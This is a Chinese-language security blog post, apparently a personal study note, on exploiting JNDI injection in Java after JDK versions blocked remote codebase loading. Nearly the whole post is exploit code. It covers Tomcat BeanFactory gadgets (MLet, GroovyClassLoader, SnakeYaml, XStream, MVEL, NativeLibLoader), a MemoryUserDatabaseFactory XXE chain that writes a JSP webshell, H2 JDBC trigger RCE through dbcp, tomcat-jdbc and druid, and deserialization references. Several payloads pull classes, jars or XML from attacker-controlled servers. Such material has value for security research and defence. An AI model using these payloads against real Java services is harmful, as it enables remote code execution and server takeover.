# JNDI学习记录(2)

  
  
&lt;!--more--&gt;  
## 0x00 前言  
高版本JDK在RMI和LDAP的`trustURLCodebase`都做了限制，从默认允许远程加载ObjectFactory变成了不允许。RMI是在6u132, 7u122, 8u113版本开始做了限制，LDAP是 11.0.1, 8u191, 7u201, 6u211版本开始做了限制。  
目前公开的常用的利用方法是通过`Tomcat`的`org.apache.naming.factory.BeanFactory`工厂类去调用`javax.el.ELProcessor#eval`方法或`groovy.lang.GroovyShell#evaluate`方法，还有就是通过`LDAP`的`javaSerializedData`反序列化`gagget`，可以说这三种方法几乎涵盖了大部分场景。  
## 0x01 基于BeanFactory  
在上一篇文章中，讲过了`org.apache.naming.factory.BeanFactory`的绕过原理。  
我们在寻找其他类的时候需要按照这个条件去找  
- JDK或常用库的类  
- 有public修饰的无参构造方法  
- public修饰的只有一个String.class类型的参数的方法，且该方法可以造成漏洞。  
### MLet  
`javax.management.loading.MLet`，是`JDK`自带的。  
`MLet`继承了`URLClassloader`，有一个无参构造方法，还有一个`addURL(String)`方法，它的父类还有一个`loadClass(String)`方法。  
刚好满足条件。  
```  
MLet mLet = new MLet();  
mLet.addURL(&#34;http://127.0.0.1:2333/&#39;);  
mLet.loadClass(&#34;Exploit&#34;);  
```  
这样就相当于是通过`URLClassloader`去远程加载类了。  
但是这样并无法触发`ClassLoader.loadClass`无法触发`static`代码块。  
不过可以用来进行`gadget`探测。可以通过`MLet`进行第一次类加载，如果类加载成功就不会影响后面访问远程类。反之，如果第一次类加载失败就会抛出异常结束后面的流程，也就不会访问远程类。  
```java  
package Server;    
    
    
import com.sun.jndi.rmi.registry.ReferenceWrapper;    
import org.apache.naming.ResourceRef;    
    
import javax.naming.StringRefAddr;    
import java.rmi.registry.LocateRegistry;    
import java.rmi.registry.Registry;    
    
public class RMIServerBypass {    
    public static void main(String[] args) throws Exception {    
        Registry registry = LocateRegistry.createRegistry(1099);    
        ReferenceWrapper refWrapper = new ReferenceWrapper(tomcatMLet());    
        registry.bind(&#34;calc&#34;,refWrapper);    
        System.out.println(&#34;Server ready&#34;);    
    }    
    private static ResourceRef tomcatMLet() {    
        ResourceRef ref = new ResourceRef(&#34;javax.management.loading.MLet&#34;, null, &#34;&#34;, &#34;&#34;, true, &#34;org.apache.naming.factory.BeanFactory&#34;, null);    
        ref.add(new StringRefAddr(&#34;forceString&#34;, &#34;a=loadClass,b=addURL,c=loadClass&#34;));    
        ref.add(new StringRefAddr(&#34;a&#34;, &#34;javax.el.ELProcessor&#34;));    
        ref.add(new StringRefAddr(&#34;b&#34;, &#34;http://127.0.0.1:2333/&#34;));    
        ref.add(new StringRefAddr(&#34;c&#34;, &#34;evil&#34;));    
        return ref;    
    };    
}  
```  
### GroovyClassLoader  
和`MLet`基本原理一样，不同于`MLet`的是`GroovyClassLoader`可以`RCE`  
```java  
private static ResourceRef tomcatGroovyClassLoader(){    
    ResourceRef ref = new ResourceRef(&#34;groovy.lang.GroovyClassLoader&#34;, null, &#34;&#34;, &#34;&#34;,    
            true, &#34;org.apache.naming.factory.BeanFactory&#34;, null);    
    ref.add(new StringRefAddr(&#34;forceString&#34;, &#34;a=addClasspath,b=loadClass&#34;));    
    ref.add(new StringRefAddr(&#34;a&#34;, &#34;http://127.0.0.1:8888/&#34;));    
    ref.add(new StringRefAddr(&#34;b&#34;, &#34;evil&#34;));    
    return ref;    
}  
```  
`evil.groovy`  
```java  
@groovy.transform.ASTTest(value={assert Runtime.getRuntime().exec(&#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#34;)})  
class Person{}  
```  
### SnakeYaml  
`new org.yaml.snakeyaml.Yaml().load(String)`正好也符合条件  
```java  
private static ResourceRef tomcat_snakeyaml(){  
    ResourceRef ref = new ResourceRef(&#34;org.yaml.snakeyaml.Yaml&#34;, null, &#34;&#34;, &#34;&#34;,  
            true, &#34;org.apache.naming.factory.BeanFactory&#34;, null);  
    String yaml = &#34;!!javax.script.ScriptEngineManager [\n&#34; &#43;  
            &#34;  !!java.net.URLClassLoader [[\n&#34; &#43;  
            &#34;    !!java.net.URL [\&#34;http://127.0.0.1:8888/exp.jar\&#34;]\n&#34; &#43;  
            &#34;  ]]\n&#34; &#43;  
            &#34;]&#34;;  
    ref.add(new StringRefAddr(&#34;forceString&#34;, &#34;a=load&#34;));  
    ref.add(new StringRefAddr(&#34;a&#34;, yaml));  
    return ref;  
}  
```  
### XString  
`new com.thoughtworks.xstream.XStream().fromXML(String)`  
```java  
private static ResourceRef tomcat_xstream(){  
    ResourceRef ref = new ResourceRef(&#34;com.thoughtworks.xstream.XStream&#34;, null, &#34;&#34;, &#34;&#34;,  
            true, &#34;org.apache.naming.factory.BeanFactory&#34;, null);  
    String xml = &#34;&lt;java.util.PriorityQueue serialization=&#39;custom&#39;&gt;\n&#34; &#43;  
            &#34;  &lt;unserializable-parents/&gt;\n&#34; &#43;  
            &#34;  &lt;java.util.PriorityQueue&gt;\n&#34; &#43;  
            &#34;    &lt;default&gt;\n&#34; &#43;  
            &#34;      &lt;size&gt;2&lt;/size&gt;\n&#34; &#43;  
            &#34;    &lt;/default&gt;\n&#34; &#43;  
            &#34;    &lt;int&gt;3&lt;/int&gt;\n&#34; &#43;  
            &#34;    &lt;dynamic-proxy&gt;\n&#34; &#43;  
            &#34;      &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n&#34; &#43;  
            &#34;      &lt;handler class=&#39;sun.tracing.NullProvider&#39;&gt;\n&#34; &#43;  
            &#34;        &lt;active&gt;true&lt;/active&gt;\n&#34; &#43;  
            &#34;        &lt;providerType&gt;java.lang.Comparable&lt;/providerType&gt;\n&#34; &#43;  
            &#34;        &lt;probes&gt;\n&#34; &#43;  
            &#34;          &lt;entry&gt;\n&#34; &#43;  
            &#34;            &lt;method&gt;\n&#34; &#43;  
            &#34;              &lt;class&gt;java.lang.Comparable&lt;/class&gt;\n&#34; &#43;  
            &#34;              &lt;name&gt;compareTo&lt;/name&gt;\n&#34; &#43;  
            &#34;              &lt;parameter-types&gt;\n&#34; &#43;  
            &#34;                &lt;class&gt;java.lang.Object&lt;/class&gt;\n&#34; &#43;  
            &#34;              &lt;/parameter-types&gt;\n&#34; &#43;  
            &#34;            &lt;/method&gt;\n&#34; &#43;  
            &#34;            &lt;sun.tracing.dtrace.DTraceProbe&gt;\n&#34; &#43;  
            &#34;              &lt;proxy class=&#39;java.lang.Runtime&#39;/&gt;\n&#34; &#43;  
            &#34;              &lt;implementing__method&gt;\n&#34; &#43;  
            &#34;                &lt;class&gt;java.lang.Runtime&lt;/class&gt;\n&#34; &#43;  
            &#34;                &lt;name&gt;exec&lt;/name&gt;\n&#34; &#43;  
            &#34;                &lt;parameter-types&gt;\n&#34; &#43;  
            &#34;                  &lt;class&gt;java.lang.String&lt;/class&gt;\n&#34; &#43;  
            &#34;                &lt;/parameter-types&gt;\n&#34; &#43;  
            &#34;              &lt;/implementing__method&gt;\n&#34; &#43;  
            &#34;            &lt;/sun.tracing.dtrace.DTraceProbe&gt;\n&#34; &#43;  
            &#34;          &lt;/entry&gt;\n&#34; &#43;  
            &#34;        &lt;/probes&gt;\n&#34; &#43;  
            &#34;      &lt;/handler&gt;\n&#34; &#43;  
            &#34;    &lt;/dynamic-proxy&gt;\n&#34; &#43;  
            &#34;    &lt;string&gt;/System/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;\n&#34; &#43;  
            &#34;  &lt;/java.util.PriorityQueue&gt;\n&#34; &#43;  
            &#34;&lt;/java.util.PriorityQueue&gt;&#34;;  
    ref.add(new StringRefAddr(&#34;forceString&#34;, &#34;a=fromXML&#34;));  
    ref.add(new StringRefAddr(&#34;a&#34;, xml));  
    return ref;  
}  
```  
### MVEL  
MVEL的入口在`org.mvel2.sh.ShellSession#exec(String)`进入会按照内置的几个命令进行处理。  
```java  
&#34;help&#34; -&gt; {Help@706}   
&#34;exit&#34; -&gt; {Exit@708}   
&#34;cd&#34; -&gt; {ChangeWorkingDir@710}   
&#34;set&#34; -&gt; {Set@712}   
&#34;showvars&#34; -&gt; {ShowVars@714}   
&#34;ls&#34; -&gt; {DirList@716}   
&#34;inspect&#34; -&gt; {ObjectInspector@718}   
&#34;pwd&#34; -&gt; {PrintWorkingDirectory@720}   
&#34;push&#34; -&gt; {PushContext@722}   
```  
其中`org.mvel2.sh.command.basic.PushContext`有调用`MVEL.eval`去解析表达式。  
也就是能够通过`ShellSession.exec`去执行push命令，从而解析MVEL表达式。  
```java  
private static ResourceRef tomcat_MVEL(){  
    ResourceRef ref = new ResourceRef(&#34;org.mvel2.sh.ShellSession&#34;, null, &#34;&#34;, &#34;&#34;,  
            true, &#34;org.apache.naming.factory.BeanFactory&#34;, null);  
    ref.add(new StringRefAddr(&#34;forceString&#34;, &#34;a=exec&#34;));  
    ref.add(new StringRefAddr(&#34;a&#34;,  
            &#34;push Runtime.getRuntime().exec(&#39;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#39;);&#34;));  
    return ref;  
}  
```  
### NativeLibLoader  
`com.sun.glass.utils.NativeLibLoader`是JDK的类，它有一个`loadLibrary(String)`方法。  
会去加载指定路径的动态链接库文件，所以只要能够上传一个动态链接库就可以用`com.sun.glass.utils.NativeLibLoader`来加载并执行命令。  
```java  
private static ResourceRef tomcat_loadLibrary(){  
    ResourceRef ref = new ResourceRef(&#34;com.sun.glass.utils.NativeLibLoader&#34;, null, &#34;&#34;, &#34;&#34;,  
            true, &#34;org.apache.naming.factory.BeanFactory&#34;, null);  
    ref.add(new StringRefAddr(&#34;forceString&#34;, &#34;a=loadLibrary&#34;));  
    ref.add(new StringRefAddr(&#34;a&#34;, &#34;/../../../../../../../../../../../../tmp/libcmd&#34;));  
    return ref;  
}  
```  
## 0x02 XXE&amp;RCE  
在`org.apache.catalina.users.MemoryUserDatabaseFactory`类中存在漏洞，  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505061836545.png)  
这里会先实例化一个`MemoryUserDatabase`对象然后从 Reference 中取出 pathname、readonly 这两个最主要的参数并调用 setter 方法赋值。  
赋值完成会先调用`open()`方法，如果readonly=false那就会调用`save()`方法。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202505061837026.png)  
#### XXE  
其中会根据`pathname`去发起本地或者远程文件访问，并使用`commons-digester`解析返回的`XML`内容，所以这里可以造成XXE漏洞。  
```java  
private static ResourceRef tomcatMemoryXXE(){    
    ResourceRef ref = new ResourceRef(&#34;org.apache.catalina.UserDatabase&#34;, null, &#34;&#34;, &#34;&#34;, true, &#34;org.apache.catalina.users.MemoryUserDatabaseFactory&#34;, null);    
    ref.add(new StringRefAddr(&#34;pathname&#34;, &#34;http://127.0.0.1:8888/exp.xml&#34;));    
    return ref;    
}  
```  
`exp.xml`  
```xml  
&lt;?xml version=&#34;1.0&#34;?&gt;  
&lt;!DOCTYPE root [  
&lt;!ENTITY % remote SYSTEM &#34;http://127.0.0.1:8888/hello&#34;&gt;  
%remote;]&gt;  
&lt;root/&gt;  
```  
#### RCE  
具体就是利用上面提到的`save()`方法，直接给出`exp`  
```java  
private static ResourceRef tomcatMkdirFrist() {  
    ResourceRef ref = new ResourceRef(&#34;org.h2.store.fs.FileUtils&#34;, null, &#34;&#34;, &#34;&#34;,  
            true, &#34;org.apache.naming.factory.BeanFactory&#34;, null);  
    ref.add(new StringRefAddr(&#34;forceString&#34;, &#34;a=createDirectory&#34;));  
    ref.add(new StringRefAddr(&#34;a&#34;, &#34;../http:&#34;));  
    return ref;  
}  
private static ResourceRef tomcatMkdirLast() {  
    ResourceRef ref = new ResourceRef(&#34;org.h2.store.fs.FileUtils&#34;, null, &#34;&#34;, &#34;&#34;,  
            true, &#34;org.apache.naming.factory.BeanFactory&#34;, null);  
    ref.add(new StringRefAddr(&#34;forceString&#34;, &#34;a=createDirectory&#34;));  
    ref.add(new StringRefAddr(&#34;a&#34;, &#34;../http:/127.0.0.1:8888&#34;));  
    return ref;  
}  
```  
##### 创建`Tomcat`管理员  
```java  
private static ResourceRef tomcatManagerAdd() {  
    ResourceRef ref = new ResourceRef(&#34;org.apache.catalina.UserDatabase&#34;, null, &#34;&#34;, &#34;&#34;,  
            true, &#34;org.apache.catalina.users.MemoryUserDatabaseFactory&#34;, null);  
    ref.add(new StringRefAddr(&#34;pathname&#34;, &#34;http://127.0.0.1:8888/../../conf/tomcat-users.xml&#34;));  
    ref.add(new StringRefAddr(&#34;readonly&#34;, &#34;false&#34;));  
    return ref;  
}  
```  
##### 写webshell  
`exp.xml`  
当访问`http://127.0.0.1:8888/webapps/ROOT/test.jsp`能返回这样一段XML  
```xml  
&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;  
&lt;tomcat-users xmlns=&#34;http://tomcat.apache.org/xml&#34;  
              xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;  
              xsi:schemaLocation=&#34;http://tomcat.apache.org/xml tomcat-users.xsd&#34;  
              version=&#34;1.0&#34;&gt;  
  &lt;role rolename=&#34;&amp;#x3c;%Runtime.getRuntime().exec(&amp;#x22;/System/Applications/Calculator.app/Contents/MacOS/Calculator&amp;#x22;); %&amp;#x3e;&#34;/&gt;  
&lt;/tomcat-users&gt;  
```  
`ResourceRef`对象就可以把`test.jsp`写入到`web`目录。  
```java  
private static ResourceRef tomcatWriteFile() {  
    ResourceRef ref = new ResourceRef(&#34;org.apache.catalina.UserDatabase&#34;, null, &#34;&#34;, &#34;&#34;,  
            true, &#34;org.apache.catalina.users.MemoryUserDatabaseFactory&#34;, null);  
    ref.add(new StringRefAddr(&#34;pathname&#34;, &#34;http://127.0.0.1:8888/../../webapps/ROOT/test.jsp&#34;));  
    ref.add(new StringRefAddr(&#34;readonly&#34;, &#34;false&#34;));  
    return ref;  
}  
```  
## 0x03 JDBC RCE  
### dbcp  
dbcp分为dbcp1和dbcp2，同时又分为`commons-dbcp`和`Tomcat`自带的`dbcp`  
进入 `org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory#configureDataSource`方法最后一段代码写了当 InitialSize &gt; 0 的时候会调用 getLogWriter 方法  
```java  
public PrintWriter getLogWriter() throws SQLException {  
    return this.createDataSource().getLogWriter();  
}  
```  
其中`getLogWriter`会先调用`createDataSource()`创建数据库连接。  
```java  
private static Reference tomcat_dbcp2_RCE(){  
    return dbcpByFactory(&#34;org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory&#34;);  
}  
private static Reference tomcat_dbcp1_RCE(){  
    return dbcpByFactory(&#34;org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory&#34;);  
}  
private static Reference commons_dbcp2_RCE(){  
    return dbcpByFactory(&#34;org.apache.commons.dbcp2.BasicDataSourceFactory&#34;);  
}  
private static Reference commons_dbcp1_RCE(){  
    return dbcpByFactory(&#34;org.apache.commons.dbcp.BasicDataSourceFactory&#34;);  
}  
private static Reference dbcpByFactory(String factory){  
    Reference ref = new Reference(&#34;javax.sql.DataSource&#34;,factory,null);  
    String JDBC_URL = &#34;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&#34; &#43;  
            &#34;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&#34; &#43;  
            &#34;java.lang.Runtime.getRuntime().exec(&#39;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#39;)\n&#34; &#43;  
            &#34;$$\n&#34;;  
    ref.add(new StringRefAddr(&#34;driverClassName&#34;,&#34;org.h2.Driver&#34;));  
    ref.add(new StringRefAddr(&#34;url&#34;,JDBC_URL));  
    ref.add(new StringRefAddr(&#34;username&#34;,&#34;root&#34;));  
    ref.add(new StringRefAddr(&#34;password&#34;,&#34;password&#34;));  
    ref.add(new StringRefAddr(&#34;initialSize&#34;,&#34;1&#34;));  
    return ref;  
}  
```  
直接打`JDBC`就可以  
四种不同版本的 dbcp 要用不同的工厂类  
### tomcat-jdbc  
如果遇到`dhcp`使用不了，可以使用`tomcat-jdbc.jar`的`org.apache.tomcat.jdbc.pool.DataSourceFactory`  
```java  
private static Reference tomcat_JDBC_RCE(){  
    return dbcpByFactory(&#34;org.apache.tomcat.jdbc.pool.DataSourceFactory&#34;);  
}  
private static Reference dbcpByFactory(String factory){  
    Reference ref = new Reference(&#34;javax.sql.DataSource&#34;,factory,null);  
    String JDBC_URL = &#34;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&#34; &#43;  
            &#34;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&#34; &#43;  
            &#34;java.lang.Runtime.getRuntime().exec(&#39;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#39;)\n&#34; &#43;  
            &#34;$$\n&#34;;  
    ref.add(new StringRefAddr(&#34;driverClassName&#34;,&#34;org.h2.Driver&#34;));  
    ref.add(new StringRefAddr(&#34;url&#34;,JDBC_URL));  
    ref.add(new StringRefAddr(&#34;username&#34;,&#34;root&#34;));  
    ref.add(new StringRefAddr(&#34;password&#34;,&#34;password&#34;));  
    ref.add(new StringRefAddr(&#34;initialSize&#34;,&#34;1&#34;));  
    return ref;  
}  
```  
### druid  
```java  
private static Reference druid(){  
    Reference ref = new Reference(&#34;javax.sql.DataSource&#34;,&#34;com.alibaba.druid.pool.DruidDataSourceFactory&#34;,null);  
    String JDBC_URL = &#34;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&#34; &#43;  
            &#34;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&#34; &#43;  
            &#34;java.lang.Runtime.getRuntime().exec(&#39;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#39;)\n&#34; &#43;  
            &#34;$$\n&#34;;  
    String JDBC_USER = &#34;root&#34;;  
    String JDBC_PASSWORD = &#34;password&#34;;  
  
    ref.add(new StringRefAddr(&#34;driverClassName&#34;,&#34;org.h2.Driver&#34;));  
    ref.add(new StringRefAddr(&#34;url&#34;,JDBC_URL));  
    ref.add(new StringRefAddr(&#34;username&#34;,JDBC_USER));  
    ref.add(new StringRefAddr(&#34;password&#34;,JDBC_PASSWORD));  
    ref.add(new StringRefAddr(&#34;initialSize&#34;,&#34;1&#34;));  
    ref.add(new StringRefAddr(&#34;init&#34;,&#34;true&#34;));  
    return ref;  
}  
```  
## 0x04 Deserialize  
**dbcp**  
```java  
ResourceRef ref = new ResourceRef(&#34;org.apache.commons.dbcp2.datasources.SharedPoolDataSource&#34;, null, &#34;&#34;, &#34;&#34;,  
                true, &#34;org.apache.commons.dbcp2.datasources.SharedPoolDataSourceFactory&#34;, null);  
ref.add(new BinaryRefAddr(&#34;jndiEnvironment&#34;, Files.readAllBytes(Paths.get(&#34;calc.bin&#34;))));  
```  
**mchange-common**  
```java  
ResourceRef ref = new ResourceRef(&#34;java.lang.String&#34;, null, &#34;&#34;, &#34;&#34;, true, &#34;com.mchange.v2.naming.JavaBeanObjectFactory&#34;, null);  
ref.add(new BinaryRefAddr(&#34;com.mchange.v2.naming.JavaBeanReferenceMaker.REF_PROPS_KEY&#34;, Files.readAllBytes(Paths.get(&#34;calc.bin&#34;))));  
```  
**hessian**  
```java  
LookupRef ref = new LookupRef(&#34;java.lang.String&#34;,&#34;look&#34;);  
ref.add(new StringRefAddr(&#34;factory&#34;, &#34;com.caucho.hessian.client.HessianProxyFactory&#34;));  
//com.caucho.burlap.client.BurlapProxyFactory  
ref.add(new StringRefAddr(&#34;type&#34;, &#34;java.lang.AutoCloseable&#34;));  
ref.add(new StringRefAddr(&#34;url&#34;, &#34;http://127.0.0.1:6666/&#34;));  
```  
## Reference  
https://conference.hitb.org/hitbsecconf2021sin/sessions/make-jdbc-attacks-brilliant-again/  
https://tttang.com/archive/1405/#toc_0x02-xxe-rce  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/jndi%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%952/  

